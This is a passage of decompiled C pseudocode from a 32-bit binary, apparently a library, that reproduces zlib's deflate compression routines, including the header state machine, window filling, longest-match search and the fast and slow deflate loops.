      v27 = (_BYTE *)(v61 + v2[2]);
      if ( v27 )
        v28 = sub_100397A2(*(_DWORD *)(a1 + 48), v27, v26);
      else
        v28 = 0;
      *(_DWORD *)(a1 + 48) = v28;
    }
  }
  if ( v2[8] == *(_DWORD *)(v2[7] + 20) )
  {
    v2[8] = 0;
LABEL_67:
    v2[1] = 73;
  }
LABEL_68:
  if ( v2[1] == 73 )
  {
    if ( !*(_DWORD *)(v2[7] + 28) )
    {
LABEL_90:
      v2[1] = 91;
      goto LABEL_91;
    }
    v29 = v2[5];
    while ( 1 )
    {
      v30 = v2[5];
      if ( v30 == v2[3] )
      {
        if ( *(_DWORD *)(v2[7] + 44) && v30 > v29 )
        {
          v31 = v30 - v29;
          v32 = (_BYTE *)(v29 + v2[2]);
          if ( v32 )
            v33 = sub_100397A2(*(_DWORD *)(a1 + 48), v32, v31);
          else
            v33 = 0;
          *(_DWORD *)(a1 + 48) = v33;
        }
        sub_1003172E(a1);
        v30 = v2[5];
        v29 = v30;
        if ( v30 == v2[3] )
          break;
      }
      v34 = v2[8];
      v35 = *(unsigned __int8 *)(*(_DWORD *)(v2[7] + 28) + v34);
      v2[8] = v34 + 1;
      *(_BYTE *)(v30 + v2[2]) = v35;
      ++v2[5];
      v62 = v35;
      if ( !v35 )
        goto LABEL_82;
    }
    v62 = 1;
LABEL_82:
    if ( *(_DWORD *)(v2[7] + 44) )
    {
      v36 = v2[5];
      if ( v36 > v29 )
      {
        v37 = v36 - v29;
        v38 = (_BYTE *)(v29 + v2[2]);
        if ( v38 )
          v39 = sub_100397A2(*(_DWORD *)(a1 + 48), v38, v37);
        else
          v39 = 0;
        *(_DWORD *)(a1 + 48) = v39;
      }
    }
    if ( !v62 )
    {
      v2[8] = 0;
      goto LABEL_90;
    }
  }
LABEL_91:
  if ( v2[1] == 91 )
  {
    if ( !*(_DWORD *)(v2[7] + 36) )
      goto LABEL_112;
    v40 = v2[5];
    while ( 1 )
    {
      v41 = v2[5];
      if ( v41 == v2[3] )
      {
        if ( *(_DWORD *)(v2[7] + 44) && v41 > v40 )
        {
          v42 = v41 - v40;
          v43 = (_BYTE *)(v40 + v2[2]);
          if ( v43 )
            v44 = sub_100397A2(*(_DWORD *)(a1 + 48), v43, v42);
          else
            v44 = 0;
          *(_DWORD *)(a1 + 48) = v44;
        }
        sub_1003172E(a1);
        v41 = v2[5];
        v40 = v41;
        if ( v41 == v2[3] )
          break;
      }
      v45 = v2[8];
      v46 = *(unsigned __int8 *)(*(_DWORD *)(v2[7] + 36) + v45);
      v2[8] = v45 + 1;
      *(_BYTE *)(v41 + v2[2]) = v46;
      ++v2[5];
      v63 = v46;
      if ( !v46 )
        goto LABEL_105;
    }
    v63 = 1;
LABEL_105:
    if ( *(_DWORD *)(v2[7] + 44) )
    {
      v47 = v2[5];
      if ( v47 > v40 )
      {
        v48 = v47 - v40;
        v49 = (_BYTE *)(v40 + v2[2]);
        if ( v49 )
          v50 = sub_100397A2(*(_DWORD *)(a1 + 48), v49, v48);
        else
          v50 = 0;
        *(_DWORD *)(a1 + 48) = v50;
      }
    }
    if ( !v63 )
LABEL_112:
      v2[1] = 103;
  }
  if ( v2[1] == 103 )
  {
    if ( !*(_DWORD *)(v2[7] + 44) )
    {
LABEL_119:
      v2[1] = 113;
      goto LABEL_120;
    }
    if ( v2[5] + 2 > (unsigned int)v2[3] )
      sub_1003172E(a1);
    v51 = v2[5];
    if ( v51 + 2 <= (unsigned int)v2[3] )
    {
      *(_BYTE *)(v51 + v2[2]) = *(_BYTE *)(a1 + 48);
      *(_BYTE *)(++v2[5] + v2[2]) = *(_BYTE *)(a1 + 49);
      ++v2[5];
      *(_DWORD *)(a1 + 48) = 0;
      goto LABEL_119;
    }
  }
LABEL_120:
  if ( v2[5] )
  {
    sub_1003172E(a1);
    if ( !*(_DWORD *)(a1 + 16) )
      goto LABEL_122;
  }
  else if ( !*(_DWORD *)(a1 + 4) && a2 <= v60 && a2 != 4 )
  {
    goto LABEL_9;
  }
  v53 = v2[1];
  if ( v53 == 666 && *(_DWORD *)(a1 + 4) )
    goto LABEL_9;
  if ( *(_DWORD *)(a1 + 4) || v2[29] || a2 && v53 != 666 )
  {
    v54 = off_10092D08[3 * v2[33]]((int)v2, a2);
    if ( v54 == 2 || v54 == 3 )
      v2[1] = 666;
    if ( !v54 || v54 == 2 )
    {
      if ( *(_DWORD *)(a1 + 16) )
        return 0;
      goto LABEL_122;
    }
    if ( v54 == 1 )
    {
      if ( a2 == 1 )
        sub_10038B9F((int)v2);
      else
        sub_10038B1F((int)v2, 0, 0, 0);
      sub_1003172E(a1);
      if ( !*(_DWORD *)(a1 + 16) )
      {
LABEL_122:
        v2[10] = -1;
        return 0;
      }
    }
  }
  if ( a2 != 4 )
    return 0;
  v55 = v2[6];
  if ( v55 <= 0 )
    return 1;
  if ( v55 == 2 )
  {
    *(_BYTE *)(v2[2] + v2[5]++) = *(_BYTE *)(a1 + 48);
    *(_BYTE *)(v2[5] + v2[2]) = *(_BYTE *)(a1 + 49);
    *(_BYTE *)(++v2[5] + v2[2]) = *(_BYTE *)(a1 + 50);
    *(_BYTE *)(++v2[5] + v2[2]) = *(_BYTE *)(a1 + 51);
    *(_BYTE *)(++v2[5] + v2[2]) = *(_BYTE *)(a1 + 8);
    *(_BYTE *)(++v2[5] + v2[2]) = *(_BYTE *)(a1 + 9);
    *(_BYTE *)(++v2[5] + v2[2]) = *(_BYTE *)(a1 + 10);
    *(_BYTE *)(++v2[5] + v2[2]) = *(_BYTE *)(a1 + 11);
    ++v2[5];
  }
  else
  {
    v56 = sub_1003170C((int)v2, *(_WORD *)(a1 + 50));
    sub_1003170C(v56, *(_WORD *)(a1 + 48));
  }
  sub_1003172E(a1);
  v57 = v2[6];
  if ( v57 > 0 )
    v2[6] = -v57;
  return v2[5] == 0;
}
// 10092D08: using guessed type int (__cdecl *off_10092D08[3])(int, int);

//----- (10031EB8) --------------------------------------------------------
int __usercall sub_10031EB8@<eax>(int a1@<esi>)
{
  int v1; // eax
  int v2; // edi
  int v3; // eax

  if ( !a1 )
    return -2;
  v1 = *(_DWORD *)(a1 + 28);
  if ( !v1 )
    return -2;
  v2 = *(_DWORD *)(v1 + 4);
  if ( v2 != 42 && v2 != 69 && v2 != 73 && v2 != 91 && v2 != 103 && v2 != 113 && v2 != 666 )
    return -2;
  v3 = *(_DWORD *)(v1 + 8);
  if ( v3 )
    (*(void (__cdecl **)(_DWORD, int))(a1 + 36))(*(_DWORD *)(a1 + 40), v3);
  if ( *(_DWORD *)(*(_DWORD *)(a1 + 28) + 68) )
    (*(void (__cdecl **)(_DWORD, _DWORD))(a1 + 36))(*(_DWORD *)(a1 + 40), *(_DWORD *)(*(_DWORD *)(a1 + 28) + 68));
  if ( *(_DWORD *)(*(_DWORD *)(a1 + 28) + 64) )
    (*(void (__cdecl **)(_DWORD, _DWORD))(a1 + 36))(*(_DWORD *)(a1 + 40), *(_DWORD *)(*(_DWORD *)(a1 + 28) + 64));
  if ( *(_DWORD *)(*(_DWORD *)(a1 + 28) + 56) )
    (*(void (__cdecl **)(_DWORD, _DWORD))(a1 + 36))(*(_DWORD *)(a1 + 40), *(_DWORD *)(*(_DWORD *)(a1 + 28) + 56));
  (*(void (__cdecl **)(_DWORD, _DWORD))(a1 + 36))(*(_DWORD *)(a1 + 40), *(_DWORD *)(a1 + 28));
  *(_DWORD *)(a1 + 28) = 0;
  if ( v2 != 113 )
    return 0;
  return -3;
}

//----- (100320CD) --------------------------------------------------------
unsigned int __usercall sub_100320CD@<eax>(unsigned __int8 **a1@<esi>, void *a2, unsigned int a3)
{
  unsigned int v3; // edi
  int v5; // eax
  int v6; // eax

  v3 = (unsigned int)a1[1];
  if ( v3 > a3 )
    v3 = a3;
  if ( !v3 )
    return 0;
  a1[1] -= v3;
  v5 = *((_DWORD *)a1[7] + 6);
  if ( v5 == 1 )
  {
    v6 = sub_10039510((unsigned int)a1[12], *a1, v3);
LABEL_11:
    a1[12] = (unsigned __int8 *)v6;
    goto LABEL_12;
  }
  if ( v5 == 2 )
  {
    if ( *a1 )
      v6 = sub_100397A2((int)a1[12], *a1, v3);
    else
      v6 = 0;
    goto LABEL_11;
  }
LABEL_12:
  memcpy(a2, *a1, v3);
  *a1 += v3;
  a1[2] += v3;
  return v3;
}

//----- (10032137) --------------------------------------------------------
int __usercall sub_10032137@<eax>(int a1@<esi>)
{
  int v1; // ecx
  int v2; // eax
  int result; // eax

  v1 = *(_DWORD *)(a1 + 68);
  *(_DWORD *)(a1 + 60) = 2 * *(_DWORD *)(a1 + 44);
  *(_WORD *)(v1 + 2 * *(_DWORD *)(a1 + 76) - 2) = 0;
  memset(*(void **)(a1 + 68), 0, 2 * *(_DWORD *)(a1 + 76) - 2);
  v2 = 6 * *(_DWORD *)(a1 + 132);
  *(_DWORD *)(a1 + 128) = (unsigned __int16)word_10092D02[v2];
  *(_DWORD *)(a1 + 140) = (unsigned __int16)word_10092D00[v2];
  *(_DWORD *)(a1 + 144) = (unsigned __int16)word_10092D04[v2];
  *(_DWORD *)(a1 + 124) = (unsigned __int16)word_10092D06[v2];
  result = 2;
  *(_DWORD *)(a1 + 108) = 0;
  *(_DWORD *)(a1 + 92) = 0;
  *(_DWORD *)(a1 + 116) = 0;
  *(_DWORD *)(a1 + 104) = 0;
  *(_DWORD *)(a1 + 72) = 0;
  *(_DWORD *)(a1 + 120) = 2;
  *(_DWORD *)(a1 + 96) = 2;
  return result;
}
// 10092D00: using guessed type __int16 word_10092D00[];
// 10092D02: using guessed type __int16 word_10092D02[];
// 10092D04: using guessed type __int16 word_10092D04[];
// 10092D06: using guessed type __int16 word_10092D06[];

//----- (100321B5) --------------------------------------------------------
unsigned int __cdecl sub_100321B5(unsigned int a1)
{
  _DWORD *v1; // ecx
  unsigned int v2; // esi
  int v3; // eax
  _BYTE *v4; // edx
  unsigned int v5; // edi
  unsigned int v6; // eax
  _BYTE *v7; // esi
  _BYTE *v8; // esi
  _BYTE *v9; // edx
  _BYTE *v10; // esi
  _BYTE *v11; // esi
  _BYTE *v12; // esi
  _BYTE *v13; // esi
  _BYTE *v14; // esi
  _BYTE *v15; // esi
  _BYTE *v16; // esi
  _BYTE *v17; // esi
  int v18; // eax
  unsigned int result; // eax
  unsigned int v20; // [esp+10h] [ebp-14h]
  unsigned int v21; // [esp+14h] [ebp-10h]
  int v22; // [esp+18h] [ebp-Ch]
  unsigned int v23; // [esp+1Ch] [ebp-8h]
  char v24; // [esp+22h] [ebp-2h]
  char v25; // [esp+23h] [ebp-1h]

  v23 = v1[31];
  v2 = v1[27];
  v22 = v1[36];
  v3 = v1[11];
  v4 = (_BYTE *)(v2 + v1[14]);
  v5 = v1[30];
  if ( v2 <= v3 - 262 )
    v21 = 0;
  else
    v21 = v2 - v3 + 262;
  v20 = (unsigned int)(v4 + 258);
  v25 = v4[v5 - 1];
  v24 = v4[v5];
  if ( v5 >= v1[35] )
    v23 >>= 2;
  if ( (unsigned int)v22 > v1[29] )
    v22 = v1[29];
  v6 = a1;
  do
  {
    v7 = (_BYTE *)(v6 + v1[14]);
    if ( v7[v5] == v24 && v7[v5 - 1] == v25 && *v7 == *v4 )
    {
      v8 = v7 + 1;
      if ( *v8 == v4[1] )
      {
        v9 = v4 + 2;
        v10 = v8 + 1;
        do
        {
          ++v9;
          v11 = v10 + 1;
          if ( *v9 != *v11 )
            break;
          ++v9;
          v12 = v11 + 1;
          if ( *v9 != *v12 )
            break;
          ++v9;
          v13 = v12 + 1;
          if ( *v9 != *v13 )
            break;
          ++v9;
          v14 = v13 + 1;
          if ( *v9 != *v14 )
            break;
          ++v9;
          v15 = v14 + 1;
          if ( *v9 != *v15 )
            break;
          ++v9;
          v16 = v15 + 1;
          if ( *v9 != *v16 )
            break;
          ++v9;
          v17 = v16 + 1;
          if ( *v9 != *v17 )
            break;
          ++v9;
          v10 = v17 + 1;
          if ( *v9 != *v10 )
            break;
        }
        while ( (unsigned int)v9 < v20 );
        v18 = (int)&v9[-v20 + 258];
        v4 = (_BYTE *)(v20 - 258);
        if ( v18 > (int)v5 )
        {
          v1[28] = a1;
          v5 = v18;
          if ( v18 >= v22 )
            break;
          v25 = v4[v18 - 1];
          v24 = v4[v18];
        }
      }
    }
    v6 = *(unsigned __int16 *)(v1[16] + 2 * (a1 & v1[13]));
    a1 = v6;
    if ( v6 <= v21 )
      break;
    --v23;
  }
  while ( v23 );
  result = v1[29];
  if ( v5 <= result )
    return v5;
  return result;
}
// 100321BB: variable 'v1' is possibly undefined

//----- (100322FA) --------------------------------------------------------
int __usercall sub_100322FA@<eax>(_DWORD *a1@<eax>, int a2@<edi>)
{
  int v3; // ecx
  _BYTE *v4; // eax
  _BYTE *v5; // ecx
  unsigned int v6; // edx
  _BYTE *v7; // eax
  _BYTE *v8; // ecx
  _BYTE *v9; // ecx
  _BYTE *v10; // ecx
  _BYTE *v11; // ecx
  _BYTE *v12; // ecx
  _BYTE *v13; // ecx
  _BYTE *v14; // ecx
  _BYTE *v15; // ecx
  int result; // eax
  unsigned int v17; // esi

  v3 = a1[14];
  v4 = (_BYTE *)(v3 + a1[27]);
  v5 = (_BYTE *)(a2 + v3);
  v6 = (unsigned int)(v4 + 258);
  if ( *v5 != *v4 || v5[1] != v4[1] )
    return 2;
  v7 = v4 + 2;
  v8 = v5 + 2;
  do
  {
    ++v7;
    v9 = v8 + 1;
    if ( *v7 != *v9 )
      break;
    ++v7;
    v10 = v9 + 1;
    if ( *v7 != *v10 )
      break;
    ++v7;
    v11 = v10 + 1;
    if ( *v7 != *v11 )
      break;
    ++v7;
    v12 = v11 + 1;
    if ( *v7 != *v12 )
      break;
    ++v7;
    v13 = v12 + 1;
    if ( *v7 != *v13 )
      break;
    ++v7;
    v14 = v13 + 1;
    if ( *v7 != *v14 )
      break;
    ++v7;
    v15 = v14 + 1;
    if ( *v7 != *v15 )
      break;
    ++v7;
    v8 = v15 + 1;
    if ( *v7 != *v8 )
      break;
  }
  while ( (unsigned int)v7 < v6 );
  result = (int)&v7[-v6 + 258];
  if ( result < 3 )
    return 2;
  a1[28] = a2;
  v17 = a1[29];
  if ( result > v17 )
    return v17;
  return result;
}

//----- (10032384) --------------------------------------------------------
unsigned int __usercall sub_10032384@<eax>(int a1@<edi>)
{
  size_t v1; // ebx
  unsigned int v2; // eax
  unsigned int v3; // esi
  int v4; // eax
  int v5; // ecx
  _WORD *v6; // eax
  bool v7; // zf
  _WORD *v8; // eax
  unsigned int result; // eax
  unsigned int v10; // esi
  unsigned __int8 *v11; // edx
  int v12; // eax
  int v13; // ecx
  int v14; // [esp+8h] [ebp-4h]
  size_t v15; // [esp+8h] [ebp-4h]

  v1 = *(_DWORD *)(a1 + 44);
  do
  {
    v2 = *(_DWORD *)(a1 + 108);
    v3 = *(_DWORD *)(a1 + 60) - *(_DWORD *)(a1 + 116) - v2;
    if ( v2 >= v1 + *(_DWORD *)(a1 + 44) - 262 )
    {
      memcpy(*(void **)(a1 + 56), (const void *)(*(_DWORD *)(a1 + 56) + v1), v1);
      v4 = *(_DWORD *)(a1 + 76);
      v5 = *(_DWORD *)(a1 + 68);
      *(_DWORD *)(a1 + 112) -= v1;
      *(_DWORD *)(a1 + 108) -= v1;
      *(_DWORD *)(a1 + 92) -= v1;
      v14 = v4;
      v6 = (_WORD *)(v5 + 2 * v4);
      do
      {
        --v6;
        v7 = v14-- == 1;
        *v6 = (*v6 - v1) & ~(unsigned __int16)(((unsigned __int16)*v6 - (unsigned __int64)v1) >> 32);
      }
      while ( !v7 );
      v15 = v1;
      v8 = (_WORD *)(*(_DWORD *)(a1 + 64) + 2 * v1);
      do
      {
        --v8;
        v7 = v15-- == 1;
        *v8 = (*v8 - v1) & ~(unsigned __int16)(((unsigned __int16)*v8 - (unsigned __int64)v1) >> 32);
      }
      while ( !v7 );
      v3 += v1;
    }
    result = *(_DWORD *)a1;
    if ( !*(_DWORD *)(*(_DWORD *)a1 + 4) )
      break;
    result = sub_100320CD(
               (unsigned __int8 **)result,
               (void *)(*(_DWORD *)(a1 + 56) + *(_DWORD *)(a1 + 108) + *(_DWORD *)(a1 + 116)),
               v3);
    *(_DWORD *)(a1 + 116) += result;
    v10 = *(_DWORD *)(a1 + 116);
    if ( v10 >= 3 )
    {
      v11 = (unsigned __int8 *)(*(_DWORD *)(a1 + 108) + *(_DWORD *)(a1 + 56));
      v12 = *v11;
      v13 = *(_DWORD *)(a1 + 88);
      *(_DWORD *)(a1 + 72) = v12;
      result = *(_DWORD *)(a1 + 84) & (v11[1] ^ (v12 << v13));
      *(_DWORD *)(a1 + 72) = result;
    }
    if ( v10 >= 0x106 )
      break;
    result = *(_DWORD *)a1;
  }
  while ( *(_DWORD *)(*(_DWORD *)a1 + 4) );
  return result;
}

//----- (10032468) --------------------------------------------------------
int __cdecl sub_10032468(int *a1, int a2)
{
  int v2; // ebx
  unsigned int v3; // eax
  bool v4; // zf
  int v5; // edx
  unsigned int v6; // ecx
  unsigned int v7; // eax
  _BYTE *v8; // ecx
  int v9; // edx
  unsigned int v10; // eax
  _BYTE *v11; // ecx
  int result; // eax
  int v13; // edi
  _BYTE *v14; // ecx

  v2 = 0xFFFF;
  if ( (unsigned int)(a1[3] - 5) < 0xFFFF )
    v2 = a1[3] - 5;
  while ( 1 )
  {
    v3 = a1[29];
    if ( v3 <= 1 )
    {
      sub_10032384((int)a1);
      v3 = a1[29];
      if ( !v3 )
        break;
    }
    v4 = v3 + a1[27] == 0;
    a1[27] += v3;
    v5 = a1[23];
    v6 = a1[27];
    a1[29] = 0;
    v7 = v5 + v2;
    if ( !v4 && v6 < v7
      || ((a1[29] = v6 - v7, a1[27] = v7, v5 < 0) ? (v8 = 0) : (v8 = (_BYTE *)(v5 + a1[14])),
          sub_10038D62(v2, (int)a1, 0, v8),
          a1[23] = a1[27],
          sub_1003172E(*a1),
          *(_DWORD *)(*a1 + 16)) )
    {
      v9 = a1[23];
      v10 = a1[27] - v9;
      if ( v10 < a1[11] - 262 )
        continue;
      v11 = v9 < 0 ? 0 : (_BYTE *)(v9 + a1[14]);
      sub_10038D62(v10, (int)a1, 0, v11);
      a1[23] = a1[27];
      sub_1003172E(*a1);
      if ( *(_DWORD *)(*a1 + 16) )
        continue;
    }
    return 0;
  }
  if ( !a2 )
    return 0;
  v13 = a1[23];
  if ( v13 < 0 )
    v14 = 0;
  else
    v14 = (_BYTE *)(v13 + a1[14]);
  sub_10038D62(a1[27] - v13, (int)a1, a2 == 4, v14);
  a1[23] = a1[27];
  sub_1003172E(*a1);
  result = 0;
  if ( *(_DWORD *)(*a1 + 16) )
    return 2 * (a2 == 4) + 1;
  if ( a2 == 4 )
    return 2;
  return result;
}

//----- (10032596) --------------------------------------------------------
int __cdecl sub_10032596(int a1, int a2)
{
  unsigned int v2; // eax
  int v3; // edx
  int v4; // edi
  int v5; // eax
  int v6; // ecx
  unsigned int v7; // ecx
  int v8; // eax
  unsigned int v9; // eax
  unsigned __int8 v10; // al
  __int16 v11; // cx
  unsigned __int16 v12; // cx
  _WORD *v13; // eax
  int v14; // eax
  unsigned int v15; // eax
  BOOL v16; // ecx
  BOOL v17; // edi
  int v18; // edx
  int v19; // ecx
  int v20; // eax
  int v21; // ebx
  int v23; // eax
  int v24; // ecx
  int v25; // edx
  int v26; // eax
  int v27; // ecx
  unsigned __int8 v28; // al
  BOOL v29; // ecx
  int v30; // edx
  _BYTE *v31; // ecx
  int v33; // edi
  _BYTE *v34; // ecx
  unsigned int v35; // [esp+Ch] [ebp-4h]

  v35 = 0;
  while ( 1 )
  {
    v2 = *(_DWORD *)(a1 + 116);
    if ( v2 < 0x106 )
    {
      sub_10032384(a1);
      v2 = *(_DWORD *)(a1 + 116);
      if ( v2 < 0x106 && !a2 )
        return 0;
      if ( !v2 )
        break;
    }
    if ( v2 >= 3 )
    {
      v3 = *(_DWORD *)(a1 + 108);
      v4 = *(_DWORD *)(a1 + 52);
      v5 = *(_DWORD *)(a1 + 84) & (*(unsigned __int8 *)(*(_DWORD *)(a1 + 56) + v3 + 2) ^ (*(_DWORD *)(a1 + 72) << *(_DWORD *)(a1 + 88)));
      v6 = *(_DWORD *)(a1 + 68);
      *(_DWORD *)(a1 + 72) = v5;
      *(_WORD *)(*(_DWORD *)(a1 + 64) + 2 * (v3 & v4)) = *(_WORD *)(v6 + 2 * v5);
      v35 = *(unsigned __int16 *)(*(_DWORD *)(a1 + 64) + 2 * (*(_DWORD *)(a1 + 52) & *(_DWORD *)(a1 + 108)));
      *(_WORD *)(*(_DWORD *)(a1 + 68) + 2 * *(_DWORD *)(a1 + 72)) = *(_WORD *)(a1 + 108);
    }
    if ( v35 )
    {
      v7 = *(_DWORD *)(a1 + 108) - v35;
      if ( v7 <= *(_DWORD *)(a1 + 44) - 262 )
      {
        v8 = *(_DWORD *)(a1 + 136);
        if ( v8 != 2 )
        {
          if ( v8 == 3 )
          {
            if ( v7 != 1 )
              goto LABEL_17;
            v9 = sub_100322FA((_DWORD *)a1, v35);
          }
          else
          {
            v9 = sub_100321B5(v35);
          }
          *(_DWORD *)(a1 + 96) = v9;
        }
      }
    }
LABEL_17:
    if ( *(_DWORD *)(a1 + 96) < 3u )
    {
      v28 = *(_BYTE *)(*(_DWORD *)(a1 + 108) + *(_DWORD *)(a1 + 56));
      *(_WORD *)(*(_DWORD *)(a1 + 5796) + 2 * *(_DWORD *)(a1 + 5792)) = 0;
      *(_BYTE *)(*(_DWORD *)(a1 + 5784) + (*(_DWORD *)(a1 + 5792))++) = v28;
      ++*(_WORD *)(a1 + 4 * v28 + 148);
      v29 = *(_DWORD *)(a1 + 5792) == *(_DWORD *)(a1 + 5788) - 1;
      --*(_DWORD *)(a1 + 116);
      v17 = v29;
    }
    else
    {
      v10 = *(_BYTE *)(a1 + 96) - 3;
      v11 = *(_WORD *)(a1 + 108) - *(_WORD *)(a1 + 112);
      *(_WORD *)(*(_DWORD *)(a1 + 5796) + 2 * *(_DWORD *)(a1 + 5792)) = v11;
      *(_BYTE *)(*(_DWORD *)(a1 + 5784) + (*(_DWORD *)(a1 + 5792))++) = v10;
      v12 = v11 - 1;
      v13 = (_WORD *)(a1 + 4 * (unsigned __int8)byte_10092AB0[v10] + 1176);
      ++*v13;
      if ( v12 >= 0x100u )
        v14 = (unsigned __int8)byte_100929B0[v12 >> 7];
      else
        v14 = (unsigned __int8)byte_100928B0[v12];
      ++*(_WORD *)(a1 + 4 * v14 + 2440);
      v15 = *(_DWORD *)(a1 + 96);
      v16 = *(_DWORD *)(a1 + 5792) == *(_DWORD *)(a1 + 5788) - 1;
      *(_DWORD *)(a1 + 116) -= v15;
      v17 = v16;
      if ( v15 > *(_DWORD *)(a1 + 128) || *(_DWORD *)(a1 + 116) < 3u )
      {
        *(_DWORD *)(a1 + 108) += v15;
        v23 = *(_DWORD *)(a1 + 108);
        v24 = *(_DWORD *)(a1 + 56);
        *(_DWORD *)(a1 + 96) = 0;
        v25 = v23 + v24;
        v26 = *(unsigned __int8 *)(v23 + v24);
        v27 = *(_DWORD *)(a1 + 88);
        *(_DWORD *)(a1 + 72) = v26;
        *(_DWORD *)(a1 + 72) = *(_DWORD *)(a1 + 84) & (*(unsigned __int8 *)(v25 + 1) ^ (v26 << v27));
        goto LABEL_29;
      }
      *(_DWORD *)(a1 + 96) = v15 - 1;
      do
      {
        v18 = ++*(_DWORD *)(a1 + 108);
        v19 = *(_DWORD *)(a1 + 68);
        v20 = *(_DWORD *)(a1 + 84) & ((*(_DWORD *)(a1 + 72) << *(_DWORD *)(a1 + 88)) ^ *(unsigned __int8 *)(v18 + *(_DWORD *)(a1 + 56) + 2));
        v21 = *(_DWORD *)(a1 + 52);
        *(_DWORD *)(a1 + 72) = v20;
        *(_WORD *)(*(_DWORD *)(a1 + 64) + 2 * (v18 & v21)) = *(_WORD *)(v19 + 2 * v20);
        v35 = *(unsigned __int16 *)(*(_DWORD *)(a1 + 64) + 2 * (*(_DWORD *)(a1 + 52) & *(_DWORD *)(a1 + 108)));
        *(_WORD *)(*(_DWORD *)(a1 + 68) + 2 * *(_DWORD *)(a1 + 72)) = *(_WORD *)(a1 + 108);
      }
      while ( (*(_DWORD *)(a1 + 96))-- != 1 );
    }
    ++*(_DWORD *)(a1 + 108);
LABEL_29:
    if ( v17 )
    {
      v30 = *(_DWORD *)(a1 + 92);
      v31 = v30 < 0 ? 0 : (_BYTE *)(v30 + *(_DWORD *)(a1 + 56));
      sub_10038D62(*(_DWORD *)(a1 + 108) - v30, a1, 0, v31);
      *(_DWORD *)(a1 + 92) = *(_DWORD *)(a1 + 108);
      sub_1003172E(*(_DWORD *)a1);
      if ( !*(_DWORD *)(*(_DWORD *)a1 + 16) )
        return 0;
    }
  }
  v33 = *(_DWORD *)(a1 + 92);
  if ( v33 < 0 )
    v34 = 0;
  else
    v34 = (_BYTE *)(v33 + *(_DWORD *)(a1 + 56));
  sub_10038D62(*(_DWORD *)(a1 + 108) - v33, a1, a2 == 4, v34);
  *(_DWORD *)(a1 + 92) = *(_DWORD *)(a1 + 108);
  sub_1003172E(*(_DWORD *)a1);
  if ( *(_DWORD *)(*(_DWORD *)a1 + 16) )
    return 2 * (a2 == 4) + 1;
  if ( a2 != 4 )
    return 0;
  return 2;
}

//----- (1003288E) --------------------------------------------------------
int __cdecl sub_1003288E(_DWORD *a1, int a2)
{
  unsigned int v3; // eax
  int v4; // edx
  int v5; // edi
  int v6; // eax
  int v7; // ecx
  unsigned int v8; // ecx
  int v9; // eax
  unsigned int v10; // eax
  unsigned int v11; // eax
  unsigned int v12; // eax
  unsigned int v13; // edi
  unsigned __int8 v14; // al
  __int16 v15; // cx
  unsigned __int16 v16; // cx
  _WORD *v17; // eax
  int v18; // eax
  int v19; // eax
  unsigned int v20; // edx
  int v21; // ebx
  int v22; // eax
  int v23; // ecx
  int v25; // eax
  int v26; // edx
  _BYTE *v27; // ecx
  unsigned __int8 v28; // al
  int v29; // edx
  _BYTE *v30; // ecx
  unsigned __int8 v32; // cl
  int v33; // edi
  _BYTE *v34; // ecx
  unsigned int v35; // [esp+Ch] [ebp-4h]
  BOOL v36; // [esp+18h] [ebp+8h]

  v35 = 0;
  while ( 1 )
  {
    v3 = a1[29];
    if ( v3 < 0x106 )
    {
      sub_10032384((int)a1);
      v3 = a1[29];
      if ( v3 < 0x106 && !a2 )
        return 0;
      if ( !v3 )
        break;
    }
    if ( v3 >= 3 )
    {
      v4 = a1[27];
      v5 = a1[13];
      v6 = a1[21] & (*(unsigned __int8 *)(a1[14] + v4 + 2) ^ (a1[18] << a1[22]));
      v7 = a1[17];
      a1[18] = v6;
      *(_WORD *)(a1[16] + 2 * (v4 & v5)) = *(_WORD *)(v7 + 2 * v6);
      v35 = *(unsigned __int16 *)(a1[16] + 2 * (a1[13] & a1[27]));
      *(_WORD *)(a1[17] + 2 * a1[18]) = *((_WORD *)a1 + 54);
    }
    a1[30] = a1[24];
    a1[25] = a1[28];
    a1[24] = 2;
    if ( !v35 )
      goto LABEL_23;
    if ( a1[30] >= a1[32] )
      goto LABEL_23;
    v8 = a1[27] - v35;
    if ( v8 > a1[11] - 262 )
      goto LABEL_23;
    v9 = a1[34];
    if ( v9 != 2 )
    {
      if ( v9 != 3 )
      {
        v10 = sub_100321B5(v35);
LABEL_17:
        a1[24] = v10;
        goto LABEL_18;
      }
      if ( v8 == 1 )
      {
        v10 = sub_100322FA(a1, v35);
        goto LABEL_17;
      }
    }
LABEL_18:
    v11 = a1[24];
    if ( v11 <= 5 && (a1[34] == 1 || v11 == 3 && (unsigned int)(a1[27] - a1[28]) > 0x1000) )
      a1[24] = 2;
LABEL_23:
    v12 = a1[30];
    if ( v12 < 3 || a1[24] > v12 )
    {
      if ( a1[26] )
      {
        v28 = *(_BYTE *)(a1[27] + a1[14] - 1);
        *(_WORD *)(a1[1449] + 2 * a1[1448]) = 0;
        *(_BYTE *)(a1[1446] + a1[1448]++) = v28;
        ++LOWORD(a1[v28 + 37]);
        if ( a1[1448] == a1[1447] - 1 )
        {
          v29 = a1[23];
          if ( v29 < 0 )
            v30 = 0;
          else
            v30 = (_BYTE *)(v29 + a1[14]);
          sub_10038D62(a1[27] - v29, (int)a1, 0, v30);
          a1[23] = a1[27];
          sub_1003172E(*a1);
        }
        ++a1[27];
        --a1[29];
        goto LABEL_44;
      }
      ++a1[27];
      --a1[29];
      a1[26] = 1;
    }
    else
    {
      v13 = a1[27] + a1[29] - 3;
      v14 = *((_BYTE *)a1 + 120) - 3;
      v15 = *((_WORD *)a1 + 54) - *((_WORD *)a1 + 50) - 1;
      *(_WORD *)(a1[1449] + 2 * a1[1448]) = v15;
      *(_BYTE *)(a1[1446] + a1[1448]++) = v14;
      v16 = v15 - 1;
      v17 = &a1[(unsigned __int8)byte_10092AB0[v14] + 294];
      ++*v17;
      if ( v16 >= 0x100u )
        v18 = (unsigned __int8)byte_100929B0[v16 >> 7];
      else
        v18 = (unsigned __int8)byte_100928B0[v16];
      ++LOWORD(a1[v18 + 610]);
      v19 = a1[30];
      v36 = a1[1448] == a1[1447] - 1;
      a1[29] += 1 - v19;
      a1[30] = v19 - 2;
      do
      {
        v20 = ++a1[27];
        if ( v20 <= v13 )
        {
          v21 = a1[13];
          v22 = a1[21] & (*(unsigned __int8 *)(a1[14] + v20 + 2) ^ (a1[18] << a1[22]));
          v23 = a1[17];
          a1[18] = v22;
          *(_WORD *)(a1[16] + 2 * (v20 & v21)) = *(_WORD *)(v23 + 2 * v22);
          v35 = *(unsigned __int16 *)(a1[16] + 2 * (a1[13] & a1[27]));
          *(_WORD *)(a1[17] + 2 * a1[18]) = *((_WORD *)a1 + 54);
        }
      }
      while ( a1[30]-- != 1 );
